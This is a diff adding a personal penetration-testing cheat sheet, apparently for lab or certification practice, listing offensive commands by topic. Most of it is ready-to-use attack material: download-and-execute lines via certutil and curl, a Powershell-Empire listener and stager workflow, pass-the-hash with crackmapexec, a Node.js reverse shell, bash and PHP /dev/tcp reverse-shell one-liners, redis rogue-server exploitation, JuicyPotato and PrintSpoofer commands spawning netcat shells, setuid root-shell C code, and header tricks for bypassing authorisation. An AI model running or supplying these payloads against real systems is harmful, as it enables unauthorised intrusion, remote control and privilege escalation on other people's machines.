@@ -1,0 +1,127 @@
+#General
+python3 -m http.server 80
+dirb http://host:port /usr/share/wordlist/wordlist (-X .php,.js)
+rar2john encrypted.rar >> rar.hash
+pdf2john encrypted.pdf >> pdf.hash
+snmpenum <IP-address> <community> <configfile>
+wpscan --url [URL] --api-token [API_TOKEN] --plugins-detection aggressive -e
+smbclient -L \\IP-ADDR -N
+smbclient \\\\IP-ADDR\\SHARE -N
+Get all files from a share:
+smbclient '\\server\share'
+mask ""
+recurse ON
+prompt OFF
+cd 'path\to\remote\dir'
+lcd '~/path/to/download/to/'
+mget *
+rpcclient remoteip -U '' -N
+In a SQL shell? Be sure to escape special characters! (\\,'',//,"")
+certutil -urlcache -split -f http:/IP/whatever.exe C:\Windows\Temp\whatever.exe
+start C:\Windows\Temp\whatever.exe
+Fix Windows path with: set PATH=%PATH%;C:\Windows\System32\
+ROPgadget --binary whatever.exe --opcode [OPCODE]
+curl http://myip/myshell -O /tmp/myshell && chmod +x myshell && ./myshell
+wget http://myip/myshell
+https://github.com/YagamiShadow/lfi-fuzz
+searchsploit [service name]
+searchsploit -m [exploit number.script]
+
+#Powershell-Empire
+First: powershell-empire server
+then in another tab/window:
+powershell-empire client
+
+uselistener http
+set Name Name123
+set Port 443
+set Host http://myip:443
+set BindingIP myip
+execute
+
+then make a stager via usestager
+copy it to wherever your http.server is, request it from the victim and wait for the agent!
+
+Once you have creds/hash:
+crackmapexec smb IP -u "USER" -H 'NTLM HASH' -M empire_exec -o LISTENER=[listener name]
+
+#FTP
+Remember to ALWAYS do 'binary' BEFORE a file transfer!
+Sometimes Windows only likes PASV mode, so always 'passive' on windows boxes first
+
+
+#Rev shells
+https://github.com/Dhayalanb/windows-php-reverse-shell.git
+JS revshell:
+'
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(443, "192.168.49.82", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+'
+https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+Python input code injection: code = 1 and __import__("os").system("echo I ran!")
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
+https://github.com/tokyoneon/Chimera
+./chimera.sh --file shells/powershell_reverse_shell.ps1 --output ../meathead/psrev.ps1 -a
+https://github.com/cermmik/C99-WebShell.git
+https://github.com/n0b0dyCN/redis-rogue-server
+python3 redis-rogue-server.py --rhost remoteip --rport 6379 --lhost myip --lport 53 -v
+^NOTE: You have to edit the binding IP in the python script on line 99!
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
+php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+#Priv Esc:
+https://github.com/ivanitlearning/Juicy-Potato-x86.git
+https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/
+JuicyPotato86.exe -l 31337 -p c:\Windows\System32\cmd.exe -a "/c C:\wamp\www\nc.exe 192.168.49.184 3389 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+
+https://github.com/itm4n/PrintSpoofer
+PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
+
+
+#GCC
+Shared library root shell:
+'
+#include<stdio.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]){
+	setuid(0);
+	system("bash -i");
+	return 0;
+}
+'
+gcc -fPIC -shared privesc.c -o privesc.so
+gcc whatever.c -o whatever
+gcc whatever.c -m32 -o whateverx86
+Spawn sh while saving user permissions:
+'
+#include <unistd.h>
+
+__attribute__((constructor))
+static void init() {
+    execl("/bin/sh", "/bin/sh", "-p", NULL);
+}
+'
+https://lzone.de/cheat-sheet/GCC
+https://github.com/funnydman/nasm-assembly-examples/blob/master/gcc-cheat-sheet.md
+
+#Burp
+Be sure to add the header: Content-Type: content-type here
+^By default Burp will adjust the 'Content-Length:' header as long as it exists!
+Be sure to fully URL Encode payloads 
+GET not returning anything? Try POST!
+http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html
+https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
+Not authorized? Try these headers: X-Forwarded-For: localhost and Host: localhost
